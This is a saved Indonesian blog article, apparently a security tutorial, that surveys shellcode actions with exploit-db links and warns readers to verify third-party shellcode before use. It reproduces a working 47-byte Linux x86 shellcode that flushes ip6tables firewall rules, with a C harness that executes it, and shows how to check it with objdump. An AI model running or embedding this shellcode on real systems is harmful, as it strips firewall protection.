@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html xmlns:fb="http://www.facebook.com/2008/fbml"><head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="Aneka%20Macam%20Shellcode_files/css.css" rel="stylesheet" type="text/css">
+<link rel="openid2.provider" href="https://www.google.com/accounts/o8/ud?source=profiles">
+<link rel="openid2.local_id" href="https://www.google.com/profiles/yohanes">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Aneka Macam Shellcode</title>
+<link rel="icon" href="https://yohan.es/favicon.ico" type="image/x-icon">
+<link href="Aneka%20Macam%20Shellcode_files/style.css" rel="stylesheet">
+<link href="Aneka%20Macam%20Shellcode_files/bootstrap.css" rel="stylesheet">
+<style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+    </style>
+<link href="Aneka%20Macam%20Shellcode_files/bootstrap-responsive.css" rel="stylesheet">
+<!--[if lt IE 9]>
+      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+<meta name="google-site-verification" content="nfHXplO1gBCV_4iGIfDjeOZ1vtNvV3JknSYms0ZdiHI">
+<script src="Aneka%20Macam%20Shellcode_files/sdk_002.js" async="" crossorigin="anonymous"></script><script id="facebook-jssdk" src="Aneka%20Macam%20Shellcode_files/sdk.js"></script><script type="text/javascript" async="" src="Aneka%20Macam%20Shellcode_files/ga.js"></script><script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-28573496-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<script async="" src="Aneka%20Macam%20Shellcode_files/lazysizes.html" type="text/javascript"></script>
+<link rel="preload" as="script" href="https://yohan.es/bootstrap/js/bootstrap.min.js"><link rel="preload" as="script" href="https://yohan.es/bootstrap/js/jquery-1.8.0.min.js"><link rel="preload" as="script" href="Aneka%20Macam%20Shellcode_files/brand"><link rel="preload" as="script" href="Aneka%20Macam%20Shellcode_files/lazysizes.html"></head>
+<body>
+<div id="fb-root"></div>
+<script type="text/javascript">(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3&appId=151853914827909";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+<div class="navbar navbar-inverse navbar-fixed-top">
+<div class="navbar-inner">
+<div class="container">
+<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</a>
+<a class="brand" href="https://yohan.es/">Yohan.es</a>
+<div class="nav-collapse collapse">
+<ul class="nav">
+<li><a href="https://yohan.es/applications/">My Apps</a></li>
+<li><a href="https://yohan.es/blackberry/">BlackBerry</a></li>
+<li><a href="https://yohan.es/android/">Android</a></li>
+<li><a href="https://yohan.es/playbook/">PlayBook</a></li>
+<li><a href="https://yohan.es/gadget/">Gadgets</a></li>
+</ul>
+<form action="https://yohan.es/search/" id="cse-search-box" class="navbar-form pull-right">
+<div>
+<input type="hidden" name="cx" value="partner-pub-2563024894235569:kg15mqcozdt">
+<input type="hidden" name="cof" value="FORID:10">
+<input type="hidden" name="ie" value="ISO-8859-1">
+<input type="text" name="q" size="31">
+<input type="submit" name="sa" value="Search" class="btn">
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+
+<div class="container">
+
+<div id="content">
+<script type="text/javascript" src="Aneka%20Macam%20Shellcode_files/brand"></script><!--<script type="text/javascript" src="//www.google.com/coop/cse/brand?form=cse-search-box&amp;lang=en"></script>-->
+
+<div id="page" style="padding-top: 0px;">
+<h1>Aneka Macam Shellcode</h1>
+<p>Secara teori, <em>shellcode</em> bisa melakukan apa saja, sesuai 
+dengan keterbatasan besarnya kode yang bisa kita injeksi dan beberapa 
+batasan sistem lain. Kita bisa saja menulis shellcode milik kita sendiri
+ -- terutama jika eksploitnya harus sangat spesifik -- tapi biasanya 
+lebih mudah menggunakan yang sudah ada. Sudah ada banyak shellcode yang 
+tersedia di Internet (misalnya ada lebih dari 400 di <a href="https://www.exploit-db.com/shellcode/">http://www.exploit-db.com/shellcode/</a> dan di <a href="http://www.shell-storm.org/shellcode/">http://www.shell-storm.org/shellcode/</a>), dan bahkan ada <em>generator shellcode</em> yang bisa menghasilkan shellcode yang mengeksekusi perintah tertentu.</p>
+<p>Membahas secara detail berbagai <em>shellcode</em> akan memakan waktu
+ terlalu banyak, jadi di artikel ini saya hanya akan membahas dua hal: 
+contoh berbagai aksi shellcode, dan bagaimana memvalidasi shellcode 
+bahwa memang benar seperti yang disebutkan. Pernah ada satu kasus, 
+seseorang mengirimkan "exploit" untuk program BIND (server DNS), dan 
+ternyata "<em>shellcode</em>" di dalam "exploit" tersebut tidak 
+digunakan untuk mengeksploit BIND (malah menyerang website nai.com). 
+Jika Anda tertarik, threadnya bisa dibaca di <a href="https://www.mail-archive.com/bugtraq@securityfocus.com/msg04243.html">http://www.mail-archive.com/bugtraq@securityfocus.com/msg04243.html</a>.</p>
+<h2>Berbagai aksi shellcode</h2>
+<p>Untuk eksploit lokal, shellcode yang paling biasa adalah menjalankan shell (<code>/bin/sh</code>). Tapi itu bukan satu-satunya yang bisa kita lakukan, beberapa aksi shellcode untuk lokal antara lain:</p>
+<ul>
+<li>Menambah user baru (biasanya dengan hak root/admin) contoh: <a href="https://www.exploit-db.com/exploits/13943">http://www.exploit-db.com/exploits/13943</a></li>
+<li>Mengubah attribut file (menambah bit setuid pada file) contoh: <a href="https://www.exploit-db.com/exploits/13915">http://www.exploit-db.com/exploits/13915</a></li>
+<li>Memaksa reboot, contoh <a href="https://www.exploit-db.com/exploits/13731">http://www.exploit-db.com/exploits/13731</a></li>
+<li>Membunuh semua proses, contoh <a href="https://www.exploit-db.com/exploits/13724">http://www.exploit-db.com/exploits/13724</a></li>
+</ul>
+<p>Dan masih banyak lagi, sedangkan untuk eksploit remote:</p>
+<ul>
+<li>Mendengarkan koneksi di port tertentu, contoh: <a href="https://www.exploit-db.com/exploits/14332">http://www.exploit-db.com/exploits/14332</a></li>
+<li>Melakukan koneksi ke port tertentu di IP tertentu (untuk bypass firewall) contoh <a href="https://www.exploit-db.com/exploits/16025">http://www.exploit-db.com/exploits/16025</a></li>
+<li>Mematikan firewall, contoh <a href="https://www.exploit-db.com/exploits/14305">http://www.exploit-db.com/exploits/14305</a></li>
+<li>Mendownload file, contoh <a href="https://www.exploit-db.com/exploits/13711">http://www.exploit-db.com/exploits/13711</a></li>
+</ul>
+<p>Dan masih banyak lagi. Semuanya tergantung kreatifitas pembuatnya. 
+Sebagian shellcode cukup unik (misalnya ada shellcode yang membuat 
+komputer "berbicara" dengan <em>text-to-speech</em>), namun ada banyak shellcode yang melakukan hal yang sama, biasanya variasinya adalah:</p>
+<ul>
+<li>Untuk OS/prosesor yang berbeda</li>
+<li>Ukurannya lebih kecil dari yang lain</li>
+<li>Tidak mengandung karakter tertentu (misalnya: shellcode yang hanya berisi karakter alfanumerik saja), baca juga <a href="https://en.wikipedia.org/wiki/Alphanumeric_code">Alphanumeric Code</a>.</li>
+<li>Menggunakan pendekatan berbeda (misalnya ada yang memakai <em>socket</em> langsung, ada yang memakai program <code>nc</code>)</li>
+</ul>
+<h2>Disasembly kode yang sudah ada</h2>
+<p>Jika ingin yakin bahwa shellcode yang Anda jalankan adalah benar 
+melakukan aksi seperti pada deskripsinya, ada dua hal yang bisa 
+dilakukan: pertama cari shellcode yang sudah terpercaya dan digunakan di
+ berbagai exploit (misalnya shellcode dari Metasploit framework), dan 
+kedua adalah memeriksa sendiri shellcodenya. Sebagian besar shellcode 
+diberi listing assemblynya, tapi sebagian lagi tidak. Bahkan untuk yang 
+diberi listing pun kadang Anda ingin memeriksa: benar tidak listingnya?</p>
+<p>Saya ambil satu contoh dari <a href="https://www.exploit-db.com/exploits/13600/">http://www.exploit-db.com/exploits/13600/</a>:</p>
+<div class="highlight-c"><pre class="hl"><span class="hl com">/*  Linux x86 - ip6tables -F - 47 bytes</span>
+<span class="hl com"> *  Jonathan Salwan &lt; submit [!] shell-storm.org &gt;</span>
+<span class="hl com"> * </span>
+<span class="hl com"> *  ! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ !</span>
+<span class="hl com"> *</span>
+<span class="hl com"> *</span>
+<span class="hl com"> *  The Gnuser Project (Gnu Users Manager) =&gt; http://www.gnuser.org</span>
+<span class="hl com"> *</span>
+<span class="hl com"> * Disassembly of section .text:</span>
+<span class="hl com"> *</span>
+<span class="hl com"> * 08048054 &lt;.text&gt;:</span>
+<span class="hl com"> * 8048054: 6a 0b                   push   $0xb</span>
+<span class="hl com"> * 8048056: 58                      pop    %eax</span>
+<span class="hl com"> * 8048057: 99                      cltd  </span>
+<span class="hl com"> * 8048058: 52                      push   %edx</span>
+<span class="hl com"> * 8048059: 66 68 2d 46             pushw  $0x462d</span>
+<span class="hl com"> * 804805d: 89 e1                   mov    %esp,%ecx</span>
+<span class="hl com"> * 804805f: 52                      push   %edx</span>
+<span class="hl com"> * 8048060: 6a 73                   push   $0x73</span>
+<span class="hl com"> * 8048062: 66 68 6c 65             pushw  $0x656c</span>
+<span class="hl com"> * 8048066: 68 36 74 61 62          push   $0x62617436</span>
+<span class="hl com"> * 804806b: 68 6e 2f 69 70          push   $0x70692f6e</span>
+<span class="hl com"> * 8048070: 68 2f 73 62 69          push   $0x6962732f</span>
+<span class="hl com"> * 8048075: 68 2f 75 73 72          push   $0x7273752f</span>
+<span class="hl com"> * 804807a: 89 e3                   mov    %esp,%ebx</span>
+<span class="hl com"> * 804807c: 52                      push   %edx</span>
+<span class="hl com"> * 804807d: 51                      push   %ecx</span>
+<span class="hl com"> * 804807e: 53                      push   %ebx</span>
+<span class="hl com"> * 804807f: 89 e1                   mov    %esp,%ecx</span>
+<span class="hl com"> * 8048081: cd 80                   int    $0x80</span>
+<span class="hl com">*/</span>
+ 
+<span class="hl ppc">#include &lt;stdio.h&gt;</span>
+ 
+<span class="hl kwb">int</span> <span class="hl kwd">main</span><span class="hl opt">(</span><span class="hl kwb">int</span> argc<span class="hl opt">,</span> <span class="hl kwb">char</span> <span class="hl opt">*</span>argv<span class="hl opt">[])</span>
+<span class="hl opt">{</span>
+<span class="hl kwb">char</span> shellcode<span class="hl opt">[] =</span>  <span class="hl str">"</span><span class="hl esc">\x6a\x0b\x58\x99\x52\x66\x68\x2d</span><span class="hl str">"</span>
+            <span class="hl str">"</span><span class="hl esc">\x46\x89\xe1\x52\x6a\x73\x66\x68</span><span class="hl str">"</span>
+            <span class="hl str">"</span><span class="hl esc">\x6c\x65\x68\x36\x74\x61\x62\x68</span><span class="hl str">"</span>
+            <span class="hl str">"</span><span class="hl esc">\x6e\x2f\x69\x70\x68\x2f\x73\x62</span><span class="hl str">"</span>
+            <span class="hl str">"</span><span class="hl esc">\x69\x68\x2f\x75\x73\x72\x89\xe3</span><span class="hl str">"</span>
+            <span class="hl str">"</span><span class="hl esc">\x52\x51\x53\x89\xe1\xcd\x80</span><span class="hl str">"</span><span class="hl opt">;</span>
+ 
+        <span class="hl kwd">fprintf</span><span class="hl opt">(</span>stdout<span class="hl opt">,</span><span class="hl str">"Length: %d</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span><span class="hl kwd">strlen</span><span class="hl opt">(</span>shellcode<span class="hl opt">));</span>
+    <span class="hl opt">(*(</span><span class="hl kwb">void</span><span class="hl opt">(*)())</span> shellcode<span class="hl opt">)();</span>      
+<span class="hl opt">}</span>
+</pre></div>
+<p>Kita bisa menggunakan objdump untuk verifikasi. Pertama pindahkan <code>shellcode</code> menjadi variabel global (deklarasikan di luar <code>main</code>). Lalu:</p>
+<pre><code>gcc shellcode.c -O shell
+objdump -D shell
+</code></pre>
+<p>Anda akan melihat bagian ini:</p>
+<pre><code> 08049640 &lt;shellcode&gt;:
+  8049640:       6a 0b                   push   $0xb
+  8049642:       58                      pop    %eax
+  8049643:       99                      cltd   
+  8049644:       52                      push   %edx
+  8049645:       66 68 2d 46             pushw  $0x462d
+  8049649:       89 e1                   mov    %esp,%ecx
+  804964b:       52                      push   %edx
+  804964c:       6a 73                   push   $0x73
+  804964e:       66 68 6c 65             pushw  $0x656c
+  8049652:       68 36 74 61 62          push   $0x62617436
+  8049657:       68 6e 2f 69 70          push   $0x70692f6e
+  804965c:       68 2f 73 62 69          push   $0x6962732f
+  8049661:       68 2f 75 73 72          push   $0x7273752f
+  8049666:       89 e3                   mov    %esp,%ebx
+  8049668:       52                      push   %edx
+  8049669:       51                      push   %ecx
+  804966a:       53                      push   %ebx
+  804966b:       89 e1                   mov    %esp,%ecx
+  804966d:       cd 80                   int    $0x80
+</code></pre>
+<p>Yang memang cocok dengan listing yang diberikan pembuatnya. Setelah 
+itu Anda bisa mentrace jalannya program dengan menggunakan gdb (atau 
+debugger lain).</p>
+<h1>Penutup</h1>
+<p>Ada banyak varian shellcode, sebagian varian sebenarnya sangat mudah dibuat (apalagi dengan bantuan <em>shellcode generator</em>). Berhati-hatilah dalam memakai <em>shellcode</em> buatan orang lain, pastikan bahwa <em>shellcode</em> tersebut benar-benar melakukan hal yang Anda inginkan.</p>
+
+<div id="backlinks">
+Links:
+<a href="https://yohan.es/security/buffer-overflow/">buffer-overflow</a>
+</div>
+<p class="footer">
+Last update: <span class="date">late Wednesday evening, March 27th, 2019</span>
+</p>
+<p>
+Copyright © 2009-2018 Yohanes Nugroho
+</p>
+</div>
+</div>
+</div>
+<!--<script src="/bootstrap/js/jquery-1.8.0.min.js" type="text/javascript"></script>-->
+<!--<script src="/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>-->
+
+
+</body></html>
